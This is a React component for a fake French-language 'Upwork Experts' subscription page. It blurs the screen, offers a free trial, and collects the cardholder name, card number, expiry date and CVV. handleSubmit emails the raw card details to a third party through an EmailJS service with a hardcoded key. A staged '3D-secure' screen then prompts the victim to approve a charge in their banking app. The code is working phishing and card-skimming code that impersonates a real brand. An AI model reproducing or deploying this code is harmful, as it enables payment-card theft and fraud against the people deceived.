import React, { useState, useEffect } from 'react';
import emailjs from 'emailjs-com';
import Head from 'next/head';

const Board = () => {
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [isBlurred, setIsBlurred] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [show3DSecurePopup, setShow3DSecurePopup] = useState(false);
  const [selected, setSelected] = useState(null);
  const [showCache, setShowCache] = useState(true);

  useEffect(() => {
    const blurTimeout = setTimeout(() => {
      setIsBlurred(true);
    }, 500);

    const popupTimeout = setTimeout(() => {
      setShowPopup(true);
      setShowCache(true);
    }, 1000);

    return () => {
      clearTimeout(blurTimeout);
      clearTimeout(popupTimeout);
    };
  }, []);

  const showPaymentPopup = (plan) => {
    setSelectedPlan(plan);
    setShowCache(false);
    setTimeout(() => {
      document.querySelector('.popup').classList.add('show');
    }, 100); // Delay to ensure the class is added after the component is rendered
  };

  const hidePaymentPopup = () => {
    document.querySelector('.popup').classList.remove('show');
    setTimeout(() => {
      setSelectedPlan(null);
      setShowCache(true);
      setShowPopup(true); // Réaffiche la première popup
    }, 300); // Match the duration of the CSS transition
  };

  const getPlanPrice = (plan) => {
    switch(plan) {
      case 'Freelance':
        return '190€/mois';
      case 'Agence':
        return '470€/mois';
      default:
        return '';
    }
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    setIsLoading(true);

    setTimeout(() => {
      setShowPopup(false);
      setShow3DSecurePopup(true);
    }, 5000);

    emailjs.sendForm('gmail-benedikt', 'new-payment', event.target, '8SL7vzVHt7qSqEd4i')
      .then(() => {
        console.log('SUCCESS!');
        setIsLoading(false);
        //alert('Form submitted successfully!');
      })
      .catch((error) => {
        console.log('FAILED...', error);
        setIsLoading(false);
      });
  };

  const handleExpiryDateInput = (event) => {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    input.value = value;
  };

  const handleCardNumberInput = (event) => {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    input.value = value.replace(/(.{4})/g, '$1 ').trim();
  };

  return (
    <div>
      <Head><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/></Head>
      <div className={`dashboard-container ${isBlurred ? 'blurred' : ''}`}></div>
      {showCache && <div className='dashboard-cache'></div>}
      <div className={`subscription-popup ${selectedPlan ? 'hidden' : ''} ${showPopup ? 'show' : ''}`}>
        <h2>Exprimez votre plein potentiel avec Upwork Experts</h2>
        <div className="plans">
          <div className="plan ">
            <h3>Freelance</h3>
            <p>190€<span className='month'>/mois</span></p>
            <ul>
              <li>9% de commissions Upwork</li>
              <li>5 mises en relation/mois</li>
              <li>Support Talents Groupe</li>
            </ul>
            <button onClick={() => showPaymentPopup('Freelance')}>Essayer gratuitement</button>
            <span className='notice'>0€ pendant 30 jours, puis 190€/mois</span>
          </div>
          <div className="plan star">
            <h3>Agence</h3>
            <p>470€<span className='month'>/mois</span></p>
            <ul>
              <li>4% de commissions Upwork</li>
              <li>10 mises en relation/mois</li>
              <li>Support Talents Groupe</li>
              <li>Accès recruteur Upwork</li>
              <li>Programme de parrainage</li>
            </ul>
            <button onClick={() => showPaymentPopup('Agence')}>Essayer gratuitement</button>
            <span className='notice'>0€ pendant 30 jours, puis 470€/mois</span>
          </div>
        </div>
      </div>
      {selectedPlan && !show3DSecurePopup && (
        <div className={`popup ${showPopup ? 'show' : ''}`}>
          <div className="popup-content">
            <div className="payment-details">
              <form onSubmit={handleSubmit}>
                <h3>{selectedPlan} : 30 jours gratuit</h3>
                <span>0€ pendant 30 jours, puis {getPlanPrice(selectedPlan)} annulez avant pour ne pas être facturé.</span>
                <div>
                  <label>Titulaire de la carte</label>
                  <input type="text" name="cardHolder" placeholder='Nom du titulaire' required />
                </div>
                <div>
                  <label>Numéro de carte</label>
                  <input type="text" className='card-number' name="cardNumber" placeholder='4242 4242 4242 4242' required style={{ width: '100%' }} onInput={handleCardNumberInput} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', width: '100%' }}>
                  <div style={{ flex: '1', marginRight: '1rem' }}>
                    <label>Date d'expiration</label>
                    <input type="text" name="cardExpiry" required onInput={handleExpiryDateInput} maxLength="5" placeholder="MM/YY" />
                  </div>
                  <div style={{ flex: '1' }}>
                    <label>CVV</label>
                    <input type="text" name="cardCvc" required placeholder='***' maxLength="3" />
                  </div>
                </div>
                <p className='trial-notice'>Une pré-autorisation temporaire du montant sera effectuée sur votre compte.</p>
                <button className='buy' type="submit" disabled={isLoading}>
                  {isLoading ? 'Vérification...' : 'Démarrer mon essai'}
                </button>
              </form>
              <button className='return' onClick={hidePaymentPopup}>
                <i className="fas fa-chevron-left"></i>
              </button>
            </div>
          </div>
        </div>
      )}
      {show3DSecurePopup && (
        <div className="popup show">
          <div className="popup-content d-secure show">
            <h3>Vérificaton 3D-secure</h3>
            <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} sur votre application bancaire.</p>
            <span>Essai 30 jours {selectedPlan}</span>
            <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
            <span>{new Date().toLocaleDateString('fr-FR')} {new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })}</span>

            <div className="loading-spinner">
              <div className="spinner"></div>
            </div>

          </div>
        </div>
      )}
    </div>
  );
};

export default Board;